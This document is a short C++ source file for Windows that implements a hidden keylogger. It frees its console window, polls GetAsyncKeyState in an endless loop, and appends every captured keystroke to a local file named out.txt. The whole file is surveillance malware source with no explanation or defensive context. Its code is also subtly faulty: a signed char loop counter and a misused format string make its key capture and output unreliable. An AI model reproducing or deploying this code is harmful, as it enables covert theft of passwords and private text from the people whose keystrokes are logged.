#include <iostream>
#include <Windows.h>
using namespace std;

//int Save(int _key, char *file);

int Save(int _key, char *file) {
	cout << _key << endl;
	FILE* OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	fprintf(OUTPUT_FILE, "%s", &_key);
	fclose(OUTPUT_FILE);
	return 0;

}

int main() {
	char i;
	FreeConsole();
	while (true) {
		Sleep(100);
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				Save(i, (char*)"out.txt");
			}
		}
	}
}
